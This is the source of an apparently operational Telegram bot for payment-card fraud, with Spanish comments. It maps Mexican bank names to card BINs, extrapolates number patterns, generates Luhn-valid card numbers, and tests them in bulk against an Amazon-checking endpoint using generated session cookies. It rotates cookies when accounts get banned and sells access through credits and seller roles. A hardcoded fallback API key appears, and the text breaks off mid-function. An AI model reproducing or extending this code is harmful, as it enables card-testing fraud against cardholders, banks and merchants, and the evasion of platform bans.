// ============================================
// BOT DE TELEGRAM - VERSIÓN DEFINITIVA CON HANDLERS
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

// ========== CONFIGURACIÓN ==========
const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    process.exit(1);
}

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const INTERNAL_API_URL = process.env.INTERNAL_API_URL || 'http://basedatos:8080/api';
const BOT_API_KEY = process.env.BOT_API_KEY || 'AALOL23894238HWKEJSNFSDGF';
const API_GENCOOKIE_URL = process.env.API_GENCOOKIE_URL || 'https://p01--gencookie--7ppzd7xy487n.code.run';
const API_EXTRAPOLADOR_URL = process.env.API_EXTRAPOLADOR_URL || 'https://p01--extrapolador--7ppzd7xy487n.code.run';
const API_AMAZON_CHECK_URL = process.env.API_AMAZON_CHECK_URL || 'https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card';
const API_LATTICE_URL = process.env.API_LATTICE_URL || 'https://api.lattice.com/check';
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;

const bot = new TelegramBot(token, { polling: true });
console.log('🤖 Bot de Telegram mejorado iniciado');

// Obtener información del bot al inicio
bot.getMe().then(me => {
    bot.botInfo = me;
    console.log(`✅ Bot identificado como: @${me.username}`);
}).catch(err => console.error('❌ Error obteniendo info del bot:', err));


const cron = require('node-cron');

cron.schedule('0 3 * * *', async () => {
    console.log('🔄 Revisión masiva de perfiles...');
    const usersRes = await pool.query(`
        SELECT id, telegram_id, telegram_username, display_name 
        FROM users 
        WHERE telegram_id IS NOT NULL AND updated_at > NOW() - INTERVAL '30 days'
    `);
    for (const user of usersRes.rows) {
        try {
            const chat = await bot.getChat(user.telegram_id);
            await checkAndUpdateTelegramProfile(user.telegram_id, user.id, chat.username, chat.first_name);
            await new Promise(r => setTimeout(r, 500));
        } catch (err) { console.error(err.message); }
    }
});


// ========== SEPARADORES BONITOS ==========
const SEPARATORS = [
    '﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌',
    '𓆩༺✧༻‧༺✧༻‧༺✧༻‧༺✧༻‧',
    '₊‿︵‿︵‿︵‿︵‿︵‿︵',
    '⋆.ೃ࿔*:･⋆.ೃ࿔*:･⋆.ೃ࿔*:･⋆.',
    '་༘.ೃ࿔ᥫ᭡.⋆་༘.ೃ࿔ᥫ᭡.⋆་༘.ೃ࿔ᥫ᭡',
];

// Diccionario local de bins por banco
const bankBins = {
    bbva: ['415231', '481515', '481514', '481516', '481283'],
    bancomer: ['415231', '481515', '481514', '481516', '481283'],
    bancoppel: ['426807', '416916'],
    santander: ['557910', '557907'],
    banamex: ['549949', '528843', '554625'],
    citibanamex: ['549949', '528843', '554625'],
    hsbc: ['491089', '421316'],
    azteca: ['402766'],
    banorte: ['418914', '493173', '493158', '491566']
};

// Obtiene los patrones (extras) ordenados por frecuencia para un BIN
async function getPatternsFromBin(chatId, bin) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 180000);
    const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bin }),
        signal: controller.signal
    });
    clearTimeout(timeoutId);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    if (!data.success || !data.data || data.data.length === 0) {
        throw new Error('No se encontraron tarjetas para ese BIN');
    }

    const patrones = {};
    for (const tarjeta of data.data) {
        const partes = tarjeta.split('|');
        if (partes.length < 3) continue;
        const numero = partes[0];
        if (numero.length !== 16) continue;
        const prefix = numero.slice(0, 12);
        const mes = partes[1];
        const año = partes[2];
        const clave = `${prefix}xxxx|${mes}|${año}`;
        patrones[clave] = (patrones[clave] || 0) + 1;
    }
    if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');

    const ordenados = Object.entries(patrones).map(([p, c]) => ({ patron: p, count: c })).sort((a, b) => b.count - a.count);
    return ordenados.map(p => {
        const [prefijo, mes, año] = p.patron.split('|');
        return `${prefijo}|${mes}|${año}|rnd`;
    });
}

async function procesarExtraConCookie(chatId, extra, index) {
    // Generar cookie
    const cookieResponse = await fetch(`${API_GENCOOKIE_URL}/generate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ country: 'MX', add_address: true })
    });
    const cookieData = await cookieResponse.json();
    if (!cookieData.success) throw new Error(`Error generando cookie para extra ${index}`);
    const cookie = cookieData.data.cookie_string;

    // Generar tarjetas desde el extra
    const tarjetas = generarTarjetasDesdePatron(extra, 20);
    if (tarjetas.length === 0) throw new Error(`No se generaron tarjetas para extra ${index}`);

    // Verificar tarjetas con esta cookie
    const resultados = [];
    for (const card of tarjetas) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 120000);
            const resp = await fetch(API_AMAZON_CHECK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ card, cookies: cookie }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await resp.json();
            resultados.push({ card, status: data.status, message: data.message });
        } catch (err) {
            resultados.push({ card, status: 'ERROR', message: err.message });
        }
        await new Promise(r => setTimeout(r, 800));
    }
    return { extra, resultados, cookieUsed: cookie };
}

function getBinForBank(bankName) {
    const name = bankName.toLowerCase().trim();
    for (const [key, bins] of Object.entries(bankBins)) {
        if (name.includes(key)) {
            return bins[Math.floor(Math.random() * bins.length)];
        }
    }
    return null;
}

function getCommandParam(msg, commandName) {
    const text = msg.text;
    // Acepta / o . como prefijo
    const regex = new RegExp(`^[\\/\\.]${commandName}(?:\\s+(.+))?`, 'i');
    const match = text.match(regex);
    if (match) {
        return match[1] ? match[1].trim() : null;
    }
    return null;
}

// Función para obtener información del BIN consultando múltiples APIs
async function getBinInfo(bin) {
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);
        const res = await fetch(`https://lookup.binlist.net/${bin}`, {
            headers: { 'User-Agent': 'Mozilla/5.0' },
            signal: controller.signal
        });
        clearTimeout(timeout);
        
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        
        return {
            bin: bin,
            bank: data.bank?.name || 'Desconocido',
            brand: data.scheme?.toUpperCase() || 'Desconocido',
            type: data.type?.toUpperCase() || 'Desconocido',
            level: data.level?.toUpperCase() || 'Desconocido',
            country: data.country?.name || 'Desconocido',
            countryCode: data.country?.alpha2 || ''
        };
    } catch (err) {
        console.error(`Error consultando BIN ${bin}:`, err.message);
        return null;
    }
}

// ========== FIN NUEVA FUNCIÓN ==========

// Función que solo extrae datos (sin usar cookie) y devuelve { tarjetas, mensajePrevio }
async function prepararExtrapolacion(chatId, telegramId, param) {
    const esBin = /^\d{6}$/.test(param);
    let normalizedParam = normalizarExtra(param);
    const esExtra = normalizedParam.includes('|') && /[0-9X]+\|\d{1,2}\|\d{2,4}/.test(normalizedParam);
    const esBanco = !esBin && !esExtra;
    
    let tarjetas = [];
    let mensajePrevio = '';
    if (esBin) {
        await sendSafeMessage(chatId, `🔮 Extrapolando BIN ${param}...`);

        let attempts = 0;
        let data = null;
        while (attempts < 3 && !data) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 420000);
                const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin: param }), signal: controller.signal
                });
                clearTimeout(timeoutId);
                data = await response.json();
                if (data.success && data.data.length > 0) break;
            } catch (err) {
                attempts++;
                if (attempts >= 3) throw err;
                await new Promise(r => setTimeout(r, 2000));
            }
        }
        if (!data.success || !data.data.length) throw new Error('Sin resultados');
        
        const patrones = {};
        for (const tarjeta of data.data) {
            const partes = tarjeta.split('|');
            if (partes.length < 3) continue;
            const numero = partes[0];
            if (numero.length !== 16) continue;
            const prefix = numero.slice(0, 12);
            const mes = partes[1];
            const año = partes[2];
            const clave = `${prefix}xxxx|${mes}|${año}`;
            patrones[clave] = (patrones[clave] || 0) + 1;
        }
        
        const ordenados = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c })).sort((a,b) => b.count - a.count);
        const mejor = ordenados[0];
        const [prefijoConX, mes, año] = mejor.patron.split('|');
        const extraElegido = `${prefijoConX}|${mes}|${año}|rnd`;
        
        let mensajeResumen = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A CHECAR: \`${prefijoConX}|${mes}|${año}|rnd\` | (${mejor.count} veces)\n\n`;
        
        const muy = ordenados.filter(p => p.count >= 3).slice(0,10);
        const mod = ordenados.filter(p => p.count === 2).slice(0,5);
        const uni = ordenados.filter(p => p.count === 1).slice(0,10);
        
        if (muy.length) {
            mensajeResumen += `🟢 MUY REPETIDOS (${muy.length}):\n`;
            for (const p of muy) {
                const [pf, m, a] = p.patron.split('|');
                mensajeResumen += `\`${pf}|${m}|${a}|rnd\` (${p.count} veces)\n`;
            }
            mensajeResumen += `\n`;
        }
        if (mod.length) {
            mensajeResumen += `🟡 MODERADOS (${mod.length}):\n`;
            for (const p of mod) {
                const [pf, m, a] = p.patron.split('|');
                mensajeResumen += `\`${pf}|${m}|${a}|rnd\` (${p.count} veces)\n`;
            }
            mensajeResumen += `\n`;
        }
        if (uni.length) {
            mensajeResumen += `🔴 ÚNICOS (${uni.length}):\n`;
            for (const p of uni) {
                const [pf, m, a] = p.patron.split('|');
                mensajeResumen += `\`${pf}|${m}|${a}|rnd\` (${p.count} vez)\n`;
            }
        }
        await sendSafeMessage(chatId, mensajeResumen, { parse_mode: 'Markdown' });
        
        tarjetas = generarTarjetasDesdePatron(extraElegido, 20);
        let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
        await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
        mensajePrevio = mensajeResumen;
        
    } else if (esExtra) {
        tarjetas = generarTarjetasDesdePatron(normalizedParam, 20);
        let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
        await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
        mensajePrevio = `🎴 *Tarjetas generadas para el extra*`;
        
    } else if (esBanco) {
        const binElegido = getBinForBank(param);
        if (!binElegido) throw new Error('No se encontraron bins');
        await sendSafeMessage(chatId, `🔍 Banco detectado. Usando BIN: ${binElegido}`);
        return await prepararExtrapolacion(chatId, telegramId, binElegido);
        
    } else {
        tarjetas = limpiarTarjetas(param);
        if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas.');
        if (tarjetas.length > 20) throw new Error('Máximo 20 tarjetas.');
        await sendSafeMessage(chatId, `💳 *Tarjetas a verificar:*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
        mensajePrevio = `💳 *Tarjetas a verificar*`;
    }
    
    return { tarjetas, mensajePrevio };
}

// Función que verifica las tarjetas con la cookie
async function verificarTarjetasConCookie(chatId, cookie, tarjetas, mensajePrevio) {
    const total = tarjetas.length;
    let progressMsg = await sendSafeMessage(chatId, `🔍 Verificando 0/${total}...`);
    const resultados = [];
    for (let i = 0; i < total; i++) {
        const card = tarjetas[i];
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 120000);
            const resp = await fetch(API_AMAZON_CHECK_URL, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await resp.json();
            const isFatalError = data.message && (
                data.message.toLowerCase().includes('cookie expirada') ||
                data.message.toLowerCase().includes('inicia sesión') ||
                data.message.toLowerCase().includes('cuenta baneada') ||
                data.message.toLowerCase().includes('account banned') ||
                data.message.toLowerCase().includes('entra a mi cuenta')
            );
            resultados.push({ card, status: data.status, message: data.message });
            if (isFatalError) {
                await sendSafeMessage(chatId, `⛔ Error fatal: ${data.message}. No se continuará verificando más tarjetas.`);
                break;
            }
        } catch (err) {
            resultados.push({ card, status: 'ERROR', message: err.message });
        }
        const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
        try {
            await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
        } catch (e) {}
        await new Promise(r => setTimeout(r, 800));
    }
    const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
    let resumen = `📊 *Resultados finales*\n${separador}\n`;
    for (const r of resultados) {
        const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
        resumen += `• Card: \`${r.card}\`\n• Status: ${r.status} ${emoji}\n${separador}\n`;
    }
    if (resumen.length > 4096) resumen = resumen.substring(0,4000) + '...';
    await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
}

// ========== VERIFICACIÓN AUTOMÁTICA DE PERFIL ==========
async function checkAndUpdateTelegramProfile(telegramId, userId, currentUsername, currentFullName) {
    const res = await pool.query(
        'SELECT telegram_username, display_name FROM users WHERE id = $1',
        [userId]
    );
    if (res.rows.length === 0) return null;
    const saved = res.rows[0];
    const changes = {};
    if (saved.telegram_username !== currentUsername) {
        changes.username = { old: saved.telegram_username, new: currentUsername };
    }
    if (saved.display_name !== currentFullName) {
        changes.display_name = { old: saved.display_name, new: currentFullName };
    }
    if (Object.keys(changes).length > 0) {
        await pool.query(
            `UPDATE users SET telegram_username = $1, display_name = $2, updated_at = NOW() WHERE id = $3`,
            [currentUsername, currentFullName, userId]
        );
        // Si no tienes la tabla profile_change_logs, comenta la siguiente línea
        await pool.query(
            `INSERT INTO profile_change_logs (user_id, old_username, new_username, old_display_name, new_display_name, detected_at)
             VALUES ($1, $2, $3, $4, $5, NOW())`,
            [userId, saved.telegram_username, currentUsername, saved.display_name, currentFullName]
        ).catch(err => console.error('Error insertando log:', err.message));
        await notifyAdminsAboutProfileChange(userId, saved, { telegram_username: currentUsername, display_name: currentFullName });
        return changes;
    }
    return null;
}

async function notifyAdminsAboutProfileChange(userId, oldData, newData) {
    const userRes = await pool.query('SELECT username, telegram_id FROM users WHERE id = $1', [userId]);
    if (userRes.rows.length === 0) return;
    const user = userRes.rows[0];
    const message = `⚠️ *CAMBIO DE PERFIL DETECTADO* ⚠️\n\n` +
                    `👤 Usuario: ${user.username}\n` +
                    `🆔 ID: ${userId}\n` +
                    `📱 Telegram ID: ${user.telegram_id}\n\n` +
                    `📛 Nombre: \`${oldData.display_name}\` → \`${newData.display_name}\`\n` +
                    `👥 Username: @${oldData.telegram_username || ''} → @${newData.telegram_username || ''}\n\n` +
                    `🕒 Detectado automáticamente.`;
    const adminsRes = await pool.query('SELECT telegram_id FROM users WHERE role = $1 AND telegram_id IS NOT NULL', ['admin']);
    for (const admin of adminsRes.rows) {
        if (admin.telegram_id) {
            try {
                await bot.sendMessage(admin.telegram_id, message, { parse_mode: 'Markdown' });
            } catch (err) { console.error('Error notificando admin:', err.message); }
        }
    }
}

// Procesa un extra generando 'cantidad' tarjetas y verificándolas con rotación asíncrona de cookies
async function procesarExtraInfinita(chatId, telegramId, extra, cantidadTarjetas, extraIndex) {
    // Generar todas las tarjetas de una vez
    const todasLasTarjetas = generarTarjetasDesdePatron(extra, cantidadTarjetas);
    const total = todasLasTarjetas.length;
    if (total === 0) throw new Error('No se generaron tarjetas para el extra');

    let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
    let currentCookie = null;
    let nextCookiePromise = null;

    // Función local para generar cookie y descontar créditos
    const generarCookieAsync = async () => {
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ country: 'MX', add_address: true })
        });
        const data = await response.json();
        if (!data.success) throw new Error('Error generando cookie');
        const creditResult = await deductCredits(telegramId, 4);
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
        stats.cookiesUsadas++;
        return data.data.cookie_string;
    };

    // Inicializar cookie actual y empezar reserva
    currentCookie = await generarCookieAsync();
    nextCookiePromise = generarCookieAsync().catch(err => {
        console.error('Error generando cookie de reserva:', err);
        return null;
    });

    // Verificar tarjeta por tarjeta
    for (let i = 0; i < total; i++) {
        const card = todasLasTarjetas[i];
        const resultado = await verificarTarjetaConCookie(card, currentCookie);

        if (resultado.status === 'LIVE') stats.lives++;
        else if (resultado.status === 'DEAD') stats.deads++;
        else stats.errors++;

        if (resultado.isBanned) {
            // Cambiar a cookie de reserva
            if (nextCookiePromise) {
                currentCookie = await nextCookiePromise;
                if (!currentCookie) throw new Error('No se pudo obtener cookie de reserva');
            } else {
                currentCookie = await generarCookieAsync();
            }
            // Lanzar nueva reserva
            nextCookiePromise = generarCookieAsync().catch(err => {
                console.error('Error generando cookie de reserva:', err);
                return null;
            });
        }
        await new Promise(r => setTimeout(r, 800));
    }

    // Limpiar promesa pendiente
    if (nextCookiePromise) nextCookiePromise.catch(() => {});
    return { extra, stats, totalTarjetas: total };
}

// ========== GESTIÓN DE ESTADOS ==========
const userStates = new Map();

function setUserState(telegramId, state) {
    if (userStates.has(telegramId)) clearTimeout(userStates.get(telegramId).timeout);
    const timeout = setTimeout(() => {
        if (userStates.get(telegramId)?.step) {
            userStates.delete(telegramId);
            bot.sendMessage(telegramId, '⏰ Tiempo de espera agotado.').catch(() => {});
        }
    }, 300000);
    userStates.set(telegramId, { ...state, timeout });
}

function clearUserState(telegramId) {
    const state = userStates.get(telegramId);
    if (state?.timeout) clearTimeout(state.timeout);
    userStates.delete(telegramId);
}

// ========== FUNCIONES PARA ADMIN/SELLER ==========
async function getUserRoleFromDB(telegramId) {
    const res = await pool.query('SELECT role FROM users WHERE telegram_id = $1', [telegramId]);
    return res.rows[0]?.role || 'user';
}

async function callApiWithBotKey(endpoint, method, body = null) {
    const url = `${INTERNAL_API_URL}${endpoint}`;
    const headers = {
        'Content-Type': 'application/json',
        'x-bot-key': BOT_API_KEY
    };
    const options = { method, headers };
    if (body) options.body = JSON.stringify(body);
    try {
        const response = await fetch(url, options);
        const data = await response.json();
        if (!data.success) throw new Error(data.error || 'Error en la API');
        return data;
    } catch (error) {
        throw new Error(`API error: ${error.message}`);
    }
}

async function findUserByUsernameOrId(identifier, requesterRole) {
    // Limpiar @ si viene
    if (identifier.startsWith('@')) identifier = identifier.substring(1);
    
    // Si es un ID numérico (entero), buscar por ID
    if (/^\d+$/.test(identifier)) {
        const userId = parseInt(identifier);
        const res = await pool.query(
            `SELECT id, username, display_name, credits, days_remaining, role, is_active, created_at, telegram_username, telegram_id
             FROM users WHERE id = $1`,
            [userId]
        );
        if (res.rows.length > 0) return res.rows[0];
    }
    
    // Buscar por username (columna username) o telegram_username (case-insensitive)
    const res = await pool.query(
        `SELECT id, username, display_name, credits, days_remaining, role, is_active, created_at, telegram_username, telegram_id
         FROM users 
         WHERE LOWER(username) = LOWER($1) OR LOWER(telegram_username) = LOWER($1)`,
        [identifier]
    );
    
    if (res.rows.length === 0) {
        throw new Error(`Usuario "${identifier}" no encontrado`);
    }
    
    const user = res.rows[0];
    
    // Si el que consulta es seller, solo puede ver usuarios con rol 'user'
    if (requesterRole === 'seller' && user.role !== 'user') {
        throw new Error('No tienes permiso para ver este usuario');
    }
    
    return user;
}

bot.onText(/^[\/\.]setadmin(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = match[1];

    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        target = msg.reply_to_message.text.trim();
    }

    // Limpiar @ si viene
    if (target && target.startsWith('@')) target = target.substring(1);

    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') {
        return sendSafeMessage(chatId, '❌ Solo administradores pueden cambiar roles a ADMIN.');
    }

    if (!target) {
        setUserState(requesterId, { step: 'awaiting_setadmin' });
        return sendSafeMessage(chatId, '👑 Envía @usuario o ID para hacerlo administrador:');
    }

    try {
        const user = await findUserByUsernameOrId(target, role);
        if (user.role === 'admin') {
            return sendSafeMessage(chatId, `⚠️ ${user.username} ya es administrador.`);
        }
        await callApiWithBotKey(`/admin/users/${user.id}/role`, 'PUT', { new_role: 'admin' });
        await sendSafeMessage(chatId, `✅ ${user.username} ahora es ADMINISTRADOR.`);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/^[\/\.]setseller(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = match[1];

    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        target = msg.reply_to_message.text.trim();
    }

    if (target && target.startsWith('@')) target = target.substring(1);

    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') {
        return sendSafeMessage(chatId, '❌ Solo administradores pueden cambiar roles a SELLER.');
    }

    if (!target) {
        setUserState(requesterId, { step: 'awaiting_setseller' });
        return sendSafeMessage(chatId, '🛒 Envía @usuario o ID para hacerlo vendedor:');
    }

    try {
        const user = await findUserByUsernameOrId(target, role);
        if (user.role === 'admin') {
            return sendSafeMessage(chatId, `⚠️ No puedes degradar a un administrador a seller. Usa /setuser para dejarlo como usuario normal.`);
        }
        if (user.role === 'seller') {
            return sendSafeMessage(chatId, `⚠️ ${user.username} ya es vendedor.`);
        }
        await callApiWithBotKey(`/admin/users/${user.id}/role`, 'PUT', { new_role: 'seller' });
        await sendSafeMessage(chatId, `✅ ${user.username} ahora es SELLER.`);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});



bot.onText(/^[\/\.]setuser(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = match[1];

    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        target = msg.reply_to_message.text.trim();
    }

    if (target && target.startsWith('@')) target = target.substring(1);

    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') {
        return sendSafeMessage(chatId, '❌ Solo administradores pueden degradar roles.');
    }

    if (!target) {
        setUserState(requesterId, { step: 'awaiting_setuser' });
        return sendSafeMessage(chatId, '👤 Envía @usuario o ID para dejarlo como usuario normal:');
    }

    try {
        const user = await findUserByUsernameOrId(target, role);
        if (user.role === 'user') {
            return sendSafeMessage(chatId, `⚠️ ${user.username} ya es usuario normal.`);
        }
        await callApiWithBotKey(`/admin/users/${user.id}/role`, 'PUT', { new_role: 'user' });
        await sendSafeMessage(chatId, `✅ ${user.username} ahora es USUARIO NORMAL.`);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

// ========== FUNCIONES DE BASE DE DATOS ==========
async function getUserByTelegramId(telegramId) {
    const res = await pool.query(
        'SELECT id, username, credits, days_remaining, cookie FROM users WHERE telegram_id = $1',
        [telegramId]
    );
    return res.rows[0];
}

async function upsertUser(telegramId, username, fullName, chatId, chatType) {
    if (chatType !== 'private') return;
    const now = new Date();
    const client = await pool.connect();
    try {
        await client.query('BEGIN');
        await client.query(`UPDATE users SET telegram_chat_id = NULL WHERE telegram_chat_id = $1`, [chatId]);
        const existing = await client.query('SELECT id FROM users WHERE telegram_id = $1', [telegramId]);
        if (existing.rows.length > 0) {
            await client.query(
                `UPDATE users SET telegram_chat_id = $1, telegram_username = $2, display_name = $3, updated_at = $4 WHERE telegram_id = $5`,
                [chatId, username, fullName, now, telegramId]
            );
        } else {
            const byUsername = await client.query('SELECT id FROM users WHERE username = $1', [username]);
            if (byUsername.rows.length > 0) {
                await client.query(
                    `UPDATE users SET telegram_id = $1, telegram_chat_id = $2, telegram_username = $3, display_name = $4, updated_at = $5 WHERE username = $6`,
                    [telegramId, chatId, username, fullName, now, username]
                );
            } else {
                await client.query(
                    `INSERT INTO users (telegram_id, telegram_username, telegram_chat_id, username, display_name, created_at) VALUES ($1, $2, $3, $4, $5, $6)`,
                    [telegramId, username, chatId, username, fullName, now]
                );
            }
        }
        await client.query('COMMIT');
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error en upsertUser:', error);
    } finally {
        client.release();
    }
}

async function updateUserCookie(telegramId, cookie) {
    await pool.query(`UPDATE users SET cookie = $1 WHERE telegram_id = $2`, [cookie, telegramId]);
}

async function deductCredits(telegramId, amount = 4) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/use-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId, amount, bot_key: BOT_API_KEY }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success) {
            return { newCredits: data.newCredits, creditsZero: data.credits_zero || false, role: data.role };
        }
        return null;
    } catch (error) {
        console.error('Error en deductCredits:', error);
        return null;
    }
}

async function checkAndKickIfNoDaysOrCredits(telegramId, chatId, requiredCredits = 0) {
    const user = await getUserByTelegramId(telegramId);
    if (!user) {
        await sendSafeMessage(chatId, '❌ Usa /start primero.');
        return false;
    }
    if (user.days_remaining <= 0) {
        if (GROUP_CHAT_ID) await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramId).catch(() => {});
        await sendSafeMessage(chatId, '❌ Tus días han expirado.');
        return false;
    }
    if (requiredCredits > 0 && user.credits < requiredCredits) {
        await sendSafeMessage(chatId, `❌ Créditos insuficientes. Necesitas: ${requiredCredits}.`);
        return false;
    }
    return true;
}

async function kickUserFromGroup(telegramUserId) {
    if (!GROUP_CHAT_ID) return false;
    try {
        await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramUserId);
        console.log(`✅ Usuario ${telegramUserId} expulsado`);
        return true;
    } catch (error) {
        console.error(`❌ Error expulsando a ${telegramUserId}:`, error.message);
        return false;
    }
}

// ========== FUNCIONES DE UTILIDAD ==========
async function sendSafeMessage(chatId, text, options = {}) {
    try {
        return await bot.sendMessage(chatId, text, options);
    } catch (error) {
        if (options.parse_mode) {
            delete options.parse_mode;
            try { return await bot.sendMessage(chatId, text, options); } catch (e) {}
        }
        return null;
    }
}

function calcularDigitoLuhn(numeroParcial) {
    let suma = 0, esPar = true;
    for (let i = numeroParcial.length - 1; i >= 0; i--) {
        let digito = parseInt(numeroParcial[i]);
        if (esPar) {
            digito *= 2;
            if (digito > 9) digito -= 9;
        }
        suma += digito;
        esPar = !esPar;
    }
    return (10 - (suma % 10)) % 10;
}

function limpiarTarjetas(textoSucio) {
    let texto = textoSucio.replace(/\r\n/g, '\n').replace(/\n+/g, '\n').trim();
    const lineas = texto.split('\n');
    const tarjetas = [];
    for (const linea of lineas) {
        let match = linea.match(/(\d{16})\s*[|│]\s*(\d{2})\s*[|│]\s*(\d{4})\s*[|│]\s*(\d{3})/);
        if (match) {
            tarjetas.push(`${match[1]}|${match[2]}|${match[3]}|${match[4]}`);
            continue;
        }
        match = linea.match(/(\d{16})\s+(\d{2})\s+(\d{4})\s+(\d{3})/);
        if (match) {
            tarjetas.push(`${match[1]}|${match[2]}|${match[3]}|${match[4]}`);
        }
    }
    return [...new Set(tarjetas)];
}

function normalizarExtra(texto) {
    let temp = texto.trim();
    temp = temp.replace(/\s*[\/-]\s*/g, '|');
    temp = temp.replace(/\s*\|\s*/g, '|');
    if (!temp.includes('|')) {
        const match = temp.match(/^([0-9X]{6,16})(\d{2})(\d{2,4})(\d{0,3})?$/);
        if (match) {
            let [, numBase, mes, año, cvv] = match;
            año = año.length === 2 ? '20' + año : año;
            return `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
        }
    }
    const partes = temp.split('|').map(p => p.trim());
    if (partes.length >= 3) {
        let [numBase, mes, año, cvv] = partes;
        mes = mes.padStart(2, '0');
        año = año.length === 2 ? '20' + año : año;
        return `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
    }
    return temp;
}

function generarTarjetasDesdePatron(patron, cantidad = 10) {
    let normalizado = patron.trim().replace(/[ /-]+/g, '|');
    if (!normalizado.includes('|') && /[0-9X]{6,16}\d{4,6}/.test(normalizado)) {
        let match = normalizado.match(/^([0-9X]{6,16})(\d{2})(\d{2,4})(\d{0,3})?$/);
        if (match) {
            let [, numBase, mes, año, cvv] = match;
            año = año.length === 2 ? '20' + año : año;
            normalizado = `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
        }
    }
    const partes = normalizado.split('|');
    if (partes.length < 3) throw new Error('Formato inválido. Usa: NUMERO|MES|AÑO|CVV');
    let [numBase, mes, año, cvv] = partes;
    mes = mes.padStart(2, '0').slice(0, 2);
    if (isNaN(parseInt(mes)) || parseInt(mes) < 1 || parseInt(mes) > 12) throw new Error('Mes inválido (01-12)');
    año = año.trim();
    if (año.length === 2) año = '20' + año;
    if (año.length !== 4 || isNaN(parseInt(año))) throw new Error('Año inválido (YYYY o YY)');
    numBase = numBase.toUpperCase();
    if (numBase.length > 16) numBase = numBase.substring(0, 16);
    if (numBase.length < 16) numBase = numBase + 'X'.repeat(16 - numBase.length);
    if (!/^[0-9X]+$/.test(numBase)) throw new Error('Solo dígitos y X');
    const tarjetas = [];
    for (let i = 0; i < cantidad; i++) {
        let numeroConX = '';
        for (let char of numBase) numeroConX += char === 'X' ? Math.floor(Math.random() * 10).toString() : char;
        const primeros15 = numeroConX.slice(0, 15);
